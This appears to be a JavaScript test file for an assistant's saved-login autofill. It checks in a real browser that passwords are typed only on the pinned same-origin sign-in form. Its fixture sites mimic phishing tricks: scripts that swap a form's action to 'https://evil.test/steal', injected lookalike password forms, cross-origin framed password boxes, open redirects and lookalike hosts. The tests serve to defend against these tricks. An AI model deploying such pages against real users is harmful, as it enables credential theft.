// The save link's pin and the filler, in a real browser (2026-11-13: the first real saved-login sign-in,
// Netflix, failed with not_signin_page because the offer pinned the site's HOME page: its one box is a
// sign-up email box, which read as a sign-in form, so the site's own "Sign In" link was never followed).
// Fixture sites are served over HTTPS on 127.0.0.1 through a local CONNECT proxy, so the browser sees
// real port-less https origins (https://acme.test) exactly as on the internet. Every value is made up.
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { createServer as createHttp } from "node:http";
import { createServer as createHttps } from "node:https";
import { connect } from "node:net";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, rmSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const dir = mkdtempSync(join(tmpdir(), "vault-pin-"));
process.env.REASON_DB_PATH = join(dir, "reason.db");
process.env.REASON_DATA_DIR = dir;
process.env.REASON_PROFILE_ROOT = join(dir, "profiles");
process.env.REASON_RECORDING_ROOT = join(dir, "recordings");
for (const k of ["REASON_ENCRYPT_REST", "REASON_ENCRYPT_REST2", "REASON_ENCRYPT_REST3"]) process.env[k] = "on";
process.env.REASON_ENCRYPT_STRICT = "1";
process.env.REASON_REST_KEK_SOURCE = "local";
process.env.REASON_REST_KEK = "4a".repeat(32);
process.env.REASON_TOKEN_KEY ||= "22".repeat(32);
process.env.REASON_TEST_ALLOW_PRIVATE_FETCH = "1";
process.env.REASON_SIGNIN_FORM_WAIT_MS = "4000";
delete process.env.REASON_LOGINS_DB_PATH;
delete process.env.REASON_VAULT_KMS;
for (const k of ["REASON_VAULT_KMS_KEY", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "REASON_REST_KMS_HOST"]) delete process.env[k];
process.env.REASON_SAVED_LOGINS = "on";

const { standInGcp, useStandIn } = await import("./helpers/gcpkms-standin.js");
mkdirSync(join(dir, "keys"));
const g = await standInGcp({ dir: join(dir, "keys") });
useStandIn(g);

const sl = await import("../src/savedlogins.js");
const { Secret } = await import("../src/secret.js");
const filler = await import("../src/filler.js");
const browser = await import("../src/browser.js");
const sp = await import("../src/signinpage.js");
let chromium;
try { ({ chromium } = await import("playwright")); } catch { /* no browser on this machine */ }

const ME = "dm:owner";
const USER = "pin-tester@example.test";
const PASS = "Stand-in-pin-7Wq!";
const TRIGGER = (site) => ({ kind: "user", messages: [{ role: "user", content: `[Fri 9:02am] sign in to ${site} and check my plan` }] });

const keyPath = join(dir, "key.pem"), certPath = join(dir, "cert.pem");
execFileSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-keyout", keyPath, "-out", certPath,
  "-days", "2", "-nodes", "-subj", "/CN=acme.test", "-addext", "subjectAltName=DNS:*.test,DNS:acme.test"], { stdio: "ignore" });
const tls = { key: readFileSync(keyPath), cert: readFileSync(certPath) };

// ---------------------------------------------------------------- the fixture sites
const page = (title, body) => `<!doctype html><html><head><title>${title}</title></head><body>${body}</body></html>`;
// A streaming site's home page: a sign-UP email box, and the site's own "Sign In" link. No password box.
const HOME = (to) => page("Watch anything", `<header><a href="${to}">Sign In</a></header>
  <h1>Unlimited films and more</h1><p>Ready to watch? Enter your email to create or restart your membership.</p>
  <form action="/signup"><label>Email address <input type="email" name="email" autocomplete="email"></label><button type="submit">Get Started</button></form>`);
const FORM = (action) => page("Sign In", `<h1>Sign In</h1><form method="post" action="${action}">
  <label>Email or mobile number <input type="text" name="userLoginId" autocomplete="username"></label>
  <label>Password <input type="password" name="password" autocomplete="current-password"></label>
  <button type="submit">Sign In</button></form>`);
const EMAIL_STEP = (action, script = "") => page("Sign in", `<h1>Sign in</h1><form method="post" action="${action}">
  <label>Email <input type="email" name="email" autocomplete="username"></label><button type="submit">Continue</button></form>${script}`);
const PASSWORD_STEP = (action, ac = "current-password") => page("Enter your password", `<h1>Enter your password</h1><form method="post" action="${action}">
  <label>Password <input type="password" name="password" autocomplete="${ac}"></label><button type="submit">Sign in</button></form>`);
const WELCOME = page("Your account", `<h1>Who's watching?</h1><a href="/logout">Sign out</a>`);

const posted = []; // { host, path, field } for every POST carrying a username or a password
const gets = []; // host + path of every other request the fixture servers answered
const CHALLENGE_FRAME = `<iframe src="https://captcha-host.test/recaptcha/api2/bframe?k=x" title="recaptcha challenge expires in two minutes" width="400" height="580"></iframe>`;
function handler(scheme) {
  return (req, res) => {
    const host = String(req.headers.host ?? "").toLowerCase();
    const u = new URL(req.url, `${scheme}://${host}`);
    const send = (code, html) => { res.writeHead(code, { "content-type": "text/html; charset=utf-8" }); res.end(html); };
    const redirect = (to) => { res.writeHead(302, { location: to }); res.end(); };
    const site = host.replace(/:\d+$/, "");
    if (req.method === "POST") {
      let raw = "";
      req.on("data", (d) => { raw += d; });
      req.on("end", () => {
        const f = new URLSearchParams(raw);
        for (const k of ["password", "email", "userLoginId"]) if (f.get(k) != null) posted.push({ scheme, host, path: u.pathname, field: k });
        if (site === "cap.test" && u.pathname === "/login" && f.get("captoken") !== "tok-ok") return send(200, FORM("/login").replace("<h1>Sign In</h1>", "<h1>Sign In</h1><p>Something went wrong. Please try again.</p>"));
        if (site === "capafter.test" && u.pathname === "/login") return send(200, page("Check", `<h1>One more step</h1>${CHALLENGE_FRAME}`));
        if (site === "ef-slow.test" && u.pathname === "/signin") { setTimeout(() => redirect("/signin/password"), 3000); return; }
        if (u.pathname === "/signin" && site.startsWith("ef")) {
          if (site === "ef-confirm.test") return redirect("/signin/confirm");
          if (site === "ef-xframe.test") return redirect("/signin/framed");
          const next = { "ef.test": "/signin/password", "ef-port.test": "https://ef-port.test:8443/signin/password",
            "ef-http.test": "http://ef-http.test/signin/password", "ef-other.test": "https://evil.test/signin/password",
            "ef-new.test": "/signin/create" }[site] ?? "/signin/password";
          return redirect(next);
        }
        return send(200, WELCOME);
      });
      return;
    }
    const routes = {
      "acme.test": { "/": () => send(200, HOME("/login")), "/login": () => send(200, FORM("/login")) },
      "locale.test": { "/": () => send(200, HOME("/login")), "/login": () => redirect("/us/login"), "/us/login": () => send(200, FORM("/us/login")) },
      "nolink.test": { "/": () => send(200, HOME("#").replace(/<header>.*?<\/header>/s, "")) },
      "offsite.test": { "/": () => send(200, HOME("https://idp-elsewhere.test/login")) },
      "wall.test": { "/": () => send(403, page("Just a moment…", "<h1>Checking your browser before you access wall.test</h1><p>Unusual traffic from your network.</p>")) },
      "evil.test": { "/signin/password": () => send(200, PASSWORD_STEP("/steal")) },
      "ef-early.test": { "/": () => send(200, HOME("/signin")), "/signin/password": () => send(200, PASSWORD_STEP("/signin/password")),
        // The page sends the tab to its own password step the moment the email is typed: a navigation
        // the filler did not cause (it has not submitted anything yet).
        "/signin": () => send(200, EMAIL_STEP("/signin", `<script>document.querySelector('input[name=email]').addEventListener('input', function () { location.href = '/signin/password'; }, { once: true });</script>`)) },
    };
    for (const s of ["ef.test", "ef-port.test", "ef-http.test", "ef-other.test", "ef-new.test"]) {
      routes[s] = { "/": () => send(200, HOME("/signin")), "/signin": () => send(200, EMAIL_STEP("/signin")),
        "/signin/password": () => send(200, PASSWORD_STEP("/signin/password")), "/signin/create": () => send(200, PASSWORD_STEP("/signin/create", "new-password")) };
    }
    // The review's fixtures (2026-11-13).
    gets.push(`${site}${u.pathname}`);
    const ef = (signin) => ({ "/": () => send(200, HOME("/signin")), "/signin": () => send(200, signin), "/signin/password": () => send(200, PASSWORD_STEP("/signin/password")) });
    Object.assign(routes, {
      // A same-site open redirect behind the home page's "Sign in" link, landing on another site's form.
      "redir.test": { "/": () => send(200, HOME("/go?to=https://evil.test/signin/password")), "/go": () => redirect(u.searchParams.get("to")) },
      // A lookalike host that merely starts with the site's name.
      "look.test": { "/": () => send(200, HOME("https://look.test.evil.test/login")) },
      "look.test.evil.test": { "/login": () => send(200, FORM("/login")) },
      // The site's sign-in on its own subdomain: fine.
      "sub.test": { "/": () => send(200, HOME("https://login.sub.test/login")) },
      "login.sub.test": { "/login": () => send(200, FORM("/login")) },
      // The only password box is inside another origin's frame.
      "xframe.test": { "/login": () => send(200, page("Sign In", `<h1>Sign In</h1><label>Email <input type="email" name="email"></label><iframe src="https://evil.test/pwframe" width="400" height="200"></iframe>`)) },
      "evil.test": { "/signin/password": () => send(200, PASSWORD_STEP("/steal")), "/pwframe": () => send(200, PASSWORD_STEP("/steal")), "/x": () => send(200, "<p>evil</p>") },
      "ef-xframe.test": { ...ef(EMAIL_STEP("/signin")), "/signin/framed": () => send(200, page("Password", `<h1>Enter your password</h1><iframe src="https://evil.test/pwframe" width="400" height="200"></iframe>`)) },
      // The form's action is swapped to another origin once the username is in.
      "ef-action.test": ef(EMAIL_STEP("/signin", `<script>document.querySelector('input[name=email]').addEventListener('input', function () { document.forms[0].action = 'https://evil.test/steal'; });</script>`)),
      // A navigation set off by the typing that starts just before the filler's own submit (300 ms in).
      "ef-late.test": ef(EMAIL_STEP("/signin", `<script>document.querySelector('input[name=email]').addEventListener('input', function () { setTimeout(function () { location.href = '/signin/password'; }, 300); }, { once: true });</script>`)),
      // A meta refresh to the password step, before anything is submitted.
      "ef-meta.test": ef(EMAIL_STEP("/signin").replace("<head>", '<head><meta http-equiv="refresh" content="0.2;url=/signin/password">')),
      // history.pushState to a lookalike path that draws its own password box, before our submit.
      "ef-push.test": ef(EMAIL_STEP("/signin", `<script>document.querySelector('input[name=email]').addEventListener('input', function () { history.pushState({}, '', '/signin/password'); document.body.insertAdjacentHTML('beforeend', '<form method="post" action="/steal"><input type="password" name="password"></form>'); }, { once: true });</script>`)),
      // After our submit: one password box the site calls "Confirm password".
      "ef-confirm.test": { ...ef(EMAIL_STEP("/signin")), "/signin/confirm": () => send(200, page("Confirm", `<h1>Confirm your password</h1><form method="post" action="/signin/confirm"><label>Confirm password <input type="password" name="password" id="confirm-password"></label></form>`)) },
      // An honest slow site: its password step comes 3 s after our submit.
      "ef-slow.test": ef(EMAIL_STEP("/signin")),
      // An honest single-page app: our click on Continue changes the path with pushState and draws the password box 1.2 s later.
      "ef-spa.test": ef(page("Sign in", `<h1>Sign in</h1><div id="f"><label>Email <input type="email" name="email" autocomplete="username"></label><button type="button" id="go">Continue</button></div>
        <script>document.getElementById('go').addEventListener('click', function () { setTimeout(function () { history.pushState({}, '', '/signin/password'); document.getElementById('f').innerHTML = '<form method="post" action="/signin/password"><label>Password <input type="password" name="password" autocomplete="current-password"></label><button type="submit">Sign in</button></form>'; }, 1200); });</script>`)),
      // reCAPTCHA-like: the sign-in page loads another origin's script, and that script puts its own frame
      // in when the username box is focused (the pin is exact by then); the frame posts a token the
      // page's submit needs. The frame also carries a password box of its own, which must never be typed.
      "cap.test": { "/login": () => send(200, FORM("/login").replace("</form>", `<input type="hidden" name="captoken" value=""></form><script src="https://captcha-host.test/api.js"></script>`)) },
      "captcha-host.test": {
        "/api.js": () => { res.writeHead(200, { "content-type": "text/javascript" }); res.end(`window.addEventListener('message', function (e) { if (e.origin === 'https://captcha-host.test') document.querySelector('[name=captoken]').value = e.data; });
          document.querySelector('[name=userLoginId]').addEventListener('focus', function () { var f = document.createElement('iframe'); f.src = 'https://captcha-host.test/recaptcha/api2/anchor?size=invisible'; f.width = 256; f.height = 60; f.title = 'reCAPTCHA'; document.body.appendChild(f); }, { once: true });`); },
        "/recaptcha/api2/anchor": () => send(200, `<form method="post" action="/steal"><input type="password" name="password"></form><script>parent.postMessage('tok-ok', '*');</script>`),
        "/recaptcha/api2/bframe": () => send(200, "<p>Select all images with traffic lights</p>"),
      },
      // A visible picture challenge on the sign-in page itself, and one after the submit.
      "capshow.test": { "/login": () => send(200, FORM("/login").replace("</form>", `</form>${CHALLENGE_FRAME}`)) },
      "capafter.test": { "/login": () => send(200, FORM("/login")) },
    });
    const fn = routes[site]?.[u.pathname];
    return fn ? fn() : send(404, "<p>not found</p>");
  };
}

let https1, https2, http1, proxy, launch, findLaunch;
const skip = { skip: chromium ? false : "playwright/chromium not installed" };
const listen = (s) => new Promise(r => s.listen(0, "127.0.0.1", () => r(s.address().port)));

before(async () => {
  if (!chromium) return;
  https1 = createHttps(tls, handler("https")); https2 = createHttps(tls, handler("https")); http1 = createHttp(handler("http"));
  const [P1, P2, PH] = [await listen(https1), await listen(https2), await listen(http1)];
  // The CONNECT proxy: any host's :443 is the first https server, :8443 the second (another origin of
  // the same host), and a plain http request goes to the http server.
  proxy = createHttp(handler("http")); // a plain http request through the proxy: the http site
  proxy.on("connect", (req, sock, head) => {
    const port = String(req.url).split(":").pop() === "8443" ? P2 : P1;
    const t = connect(port, "127.0.0.1", () => { sock.write("HTTP/1.1 200 Connection Established\r\n\r\n"); t.write(head); t.pipe(sock); sock.pipe(t); });
    t.on("error", () => sock.destroy()); sock.on("error", () => t.destroy());
  });
  const PP = await listen(proxy);
  const opts = { headless: true, proxy: { server: `http://127.0.0.1:${PP}` } };
  // The filler's launcher: the person's own profile dir, the fixture cert trusted. Production has neither.
  launch = async ({ conversationId }) => {
    const context = await chromium.launchPersistentContext(browser.profileDirFor(conversationId), { ...opts, viewport: { width: 1280, height: 900 }, ignoreHTTPSErrors: true });
    return { context, close: async () => { await context.close().catch(() => {}); } };
  };
  // The offer's look-up: a throwaway browser, as in production.
  findLaunch = async () => {
    const b = await chromium.launch(opts);
    const context = await b.newContext({ viewport: { width: 1280, height: 800 }, ignoreHTTPSErrors: true });
    return { context, close: () => b.close() };
  };
});
after(async () => {
  for (const s of [https1, https2, http1, proxy]) if (s) { s.closeAllConnections?.(); await new Promise(r => s.close(r)); }
  await g.close();
  rmSync(dir, { recursive: true, force: true });
});

const entry = (site) => ({ site, label: site, signin_url: `https://${site}/`, generic: true });
const find = (site) => browser.findLoginForm(entry(site), { launch: findLaunch, waitMs: 4000 });
const S = s => new Secret(Buffer.from(s, "utf8"));
async function save(site, url) {
  for (const r of sl.listLogins(ME)) sl.removeLogin(ME, r.id);
  const u = new URL(url);
  return sl.saveLogin(ME, {
    site, label: site, signinOrigin: u.origin, signinPath: u.pathname, permission: "standing",
    consentVersion: "saved-login-v1", consentAt: Date.now(), consentCredential: "standin-passkey-credential-1",
  }, { username: S(USER), password: S(PASS), totp: null });
}
const signIn = (site) => filler.signIn(ME, site, { trigger: TRIGGER(site), launch, purpose: "check the plan" });
const passwordsTo = () => posted.filter(p => p.field === "password");

// ---------------------------------------------------------------- the pure rule
test("loginFormOf: a sign-up email box on a home page is not a sign-in form; a password box is; email-first only on a sign-in path", () => {
  const f = (type, extra = {}) => ({ type, ac: "", name: "", id: "", label: "", ...extra });
  const home = { url: "https://www.netflix.example/", text: "Enter your email to create or restart your membership.", fields: [f("email", { label: "Email address" })] };
  assert.equal(sp.pageKind(home), "signin_form", "pageKind (the emailed-code route's reading) still calls it a form");
  assert.equal(sp.loginFormOf(home), null, "but no saved login is ever pinned to it");
  assert.equal(sp.loginFormOf({ ...home, url: "https://www.netflix.example/us/" }), null, "not a sign-in path either");
  assert.equal(sp.loginFormOf({ url: "https://a.test/login", fields: [f("text", { label: "Email or mobile number" }), f("password")] }), "password");
  assert.equal(sp.loginFormOf({ url: "https://a.test/", fields: [f("email"), f("password")] }), "password", "a home page that carries the real form is fine");
  assert.equal(sp.loginFormOf({ url: "https://a.test/signin", fields: [f("email")] }), "email_first");
  assert.equal(sp.loginFormOf({ url: "https://a.test/us/login", fields: [f("text", { ac: "username" })] }), "email_first");
  assert.equal(sp.loginFormOf({ url: "https://a.test/join", fields: [f("password", { ac: "new-password" })] }), null, "making an account");
  assert.equal(sp.loginFormOf({ url: "https://a.test/login", fields: [f("password", { ac: "new-password" })] }), null);
  assert.equal(sp.loginFormOf({ url: "https://a.test/login", fields: [f("password"), f("password")] }), null, "two password boxes");
  assert.equal(sp.loginFormOf({ url: "https://a.test/login", fields: [f("email"), f("tel")] }), null);
  assert.equal(sp.loginFormOf({ url: "https://a.test/login", fields: [] }), null);
});

// ---------------------------------------------------------------- the pin, in a real browser
test("the pin: the home page's sign-up box is passed by; the site's own Sign In link is followed to the page that has the form", skip, async () => {
  const at = await find("acme.test");
  assert.equal(at.found, true, JSON.stringify(at));
  assert.equal(at.url, "https://acme.test/login");
  assert.equal(at.form, "password");
  assert.equal(at.followed, true);
});

test("the pin: a sign-in link that redirects to a locale path pins the final page", skip, async () => {
  const at = await find("locale.test");
  assert.equal(at.found, true, JSON.stringify(at));
  assert.equal(at.url, "https://locale.test/us/login");
  assert.equal(at.form, "password");
});

test("the pin: an email-first sign-in page is pinned as one", skip, async () => {
  const at = await find("ef.test");
  assert.deepEqual([at.found, at.url, at.form], [true, "https://ef.test/signin", "email_first"]);
});

test("no form, no pin: no sign-in link, a link to another company's site, a wall: each says why and pins nothing", skip, async () => {
  for (const [site, why] of [["nolink.test", "no_form"], ["offsite.test", "off_site"], ["wall.test", "wall"]]) {
    const at = await find(site);
    assert.equal(at.found, false, site);
    assert.equal(at.url, "", site);
    assert.equal(at.why, why, site);
  }
});

// ---------------------------------------------------------------- the filler at the pinned page
test("the filler signs in on the page the pin found (the home page passed by, the link followed)", skip, async () => {
  posted.length = 0;
  for (const site of ["acme.test", "locale.test"]) {
    const at = await find(site);
    await save(site, at.url);
    const out = await signIn(site);
    assert.equal(out.result, "signed_in", `${site}: ${out.say_exactly}`);
  }
  assert.deepEqual(passwordsTo().map(p => `${p.scheme}://${p.host}${p.path}`), ["https://acme.test/login", "https://locale.test/us/login"]);
});

test("repair: a login pinned to a home page with no sign-in form types nothing and says it needs saving again", skip, async () => {
  posted.length = 0;
  await save("acme.test", "https://acme.test/");
  const out = await signIn("acme.test");
  assert.equal(out.result, "not_signin_page");
  assert.equal(out.resave, true);
  assert.match(out.say_exactly, /needs saving again on .*: tell me to forget it and I.ll send you a new link/);
  assert.equal(posted.length, 0, "nothing typed, nothing posted");
  assert.equal(sl.listLogins(ME).length, 1, "the saved login is left as it is: never re-pinned behind their back");
});

test("email-first: the password is typed after OUR submit, on the same exact origin, into a real password box", skip, async () => {
  posted.length = 0;
  await save("ef.test", "https://ef.test/signin");
  const out = await signIn("ef.test");
  assert.equal(out.result, "signed_in", out.say_exactly);
  assert.deepEqual(posted.map(p => `${p.host}${p.path}:${p.field}`), ["ef.test/signin:email", "ef.test/signin/password:password"]);
});

test("email-first refused: another port, http, another origin, a new-password box, a navigation we did not cause: the password is never typed", skip, async () => {
  for (const site of ["ef-port.test", "ef-http.test", "ef-other.test", "ef-new.test", "ef-early.test"]) {
    posted.length = 0;
    await save(site, `https://${site}/signin`);
    const out = await signIn(site);
    assert.notEqual(out.result, "signed_in", site);
    assert.ok(["not_signin_page", "origin_mismatch"].includes(out.result), `${site}: ${out.result}`);
    assert.deepEqual(passwordsTo(), [], `${site}: no password reached any server`);
  }
});

// ---------------------------------------------------------------- the ship review (2026-11-13)
test("review, the pin: an open redirect behind the Sign in link, a lookalike host: no link; the site's own subdomain: pinned", skip, async () => {
  const intake = await import("../src/loginintake.js");
  const redir = await find("redir.test");
  // The look-up may land on the other site's form, but the offer then refuses it: the pin is the final page, same site only.
  if (redir.found) assert.notEqual(new URL(redir.url).hostname.endsWith("redir.test"), true, JSON.stringify(redir));
  process.env.REASON_SAVED_LOGINS = "on";
  const out = await intake.offerSaveLink(ME, "redir.test", "save my redir.test login", { locate: async () => redir });
  assert.equal(out.ok, false, JSON.stringify(out));
  const look = await find("look.test");
  assert.deepEqual([look.found, look.why], [false, "off_site"], JSON.stringify(look));
  const sub = await find("sub.test");
  assert.deepEqual([sub.found, sub.url], [true, "https://login.sub.test/login"], JSON.stringify(sub));
});

test("review: a password box inside another origin's frame is never typed (a password page, and an email-first step)", skip, async () => {
  for (const [site, url] of [["xframe.test", "https://xframe.test/login"], ["ef-xframe.test", "https://ef-xframe.test/signin"]]) {
    posted.length = 0;
    await save(site, url);
    const out = await signIn(site);
    assert.notEqual(out.result, "signed_in", site);
    assert.deepEqual(passwordsTo(), [], `${site}: no password reached any server`);
  }
});

test("review: action swapped off-origin, a late self-navigation, a meta refresh, a pushState lookalike, a confirm box: the password is never typed", skip, async () => {
  for (const site of ["ef-action.test", "ef-late.test", "ef-meta.test", "ef-push.test", "ef-confirm.test"]) {
    posted.length = 0;
    await save(site, `https://${site}/signin`);
    const out = await signIn(site);
    assert.notEqual(out.result, "signed_in", site);
    assert.deepEqual(passwordsTo(), [], `${site}: no password reached any server`);
    assert.equal(posted.some(p => p.host === "evil.test"), false, `${site}: nothing reached another site`);
  }
});

test("review: honest slow email-first sites still sign in (a 3 s server, a single-page app's pushState after our click)", skip, async () => {
  for (const site of ["ef-slow.test", "ef-spa.test"]) {
    posted.length = 0;
    await save(site, `https://${site}/signin`);
    const out = await signIn(site);
    assert.equal(out.result, "signed_in", `${site}: ${out.say_exactly}`);
    assert.deepEqual(passwordsTo().map(p => `${p.host}${p.path}`), [`${site}/signin/password`], site);
  }
});

test("reCAPTCHA: the sign-in page's own cross-origin script and frame load under the lock; the password goes only into the top frame", skip, async () => {
  posted.length = 0; gets.length = 0;
  await save("cap.test", "https://cap.test/login");
  const out = await signIn("cap.test");
  assert.ok(gets.includes("captcha-host.test/api.js"), "the script loaded");
  assert.ok(gets.includes("captcha-host.test/recaptcha/api2/anchor"), "the frame put in after the pin loaded");
  assert.equal(out.result, "signed_in", out.say_exactly);
  assert.deepEqual(passwordsTo().map(p => `${p.host}${p.path}`), ["cap.test/login"], "only the top frame's form carried it");
});

test("reCAPTCHA: a visible picture challenge stops it as blocked, before typing or after the submit, and it does not retry", skip, async () => {
  posted.length = 0;
  await save("capshow.test", "https://capshow.test/login");
  const a = await signIn("capshow.test");
  assert.equal(a.result, "blocked", a.say_exactly);
  assert.deepEqual(passwordsTo(), [], "nothing typed under a visible challenge");
  await save("capafter.test", "https://capafter.test/login");
  const b = await signIn("capafter.test");
  assert.equal(b.result, "blocked", b.say_exactly);
  const again = await signIn("capafter.test");
  assert.equal(again.result, "paused", "one refusal stops");
});

test("review: the lock still refuses a top-level page on another origin while a sub-frame may load", skip, async () => {
  const s = await launch({ conversationId: "dm:lock-probe" });
  try {
    await browser.guardContext(s.context, { conversationId: "dm:lock-probe" });
    const p = s.context.pages()[0] ?? await s.context.newPage();
    await p.goto("https://cap.test/login", { waitUntil: "domcontentloaded" });
    browser.pinSite("dm:lock-probe", "cap.test", { hosts: ["cap.test"], exact: "https://cap.test", secure: true });
    gets.length = 0;
    await p.evaluate(() => { const f = document.createElement("iframe"); f.src = "https://evil.test/x"; document.body.appendChild(f); });
    await p.waitForTimeout(800);
    assert.ok(gets.includes("evil.test/x"), "a sub-frame loads");
    let refused = false;
    try { await p.goto("https://evil.test/x", { timeout: 5000 }); } catch { refused = true; }
    assert.equal(refused, true, "a top-level load off the pin is refused");
    assert.equal(new URL(p.url()).hostname, "cap.test");
    await p.waitForTimeout(500);
    assert.notEqual(new URL(p.url()).hostname, "evil.test", "still not on the other origin");
  } finally { browser.unpinSite("dm:lock-probe"); await s.close(); }
});
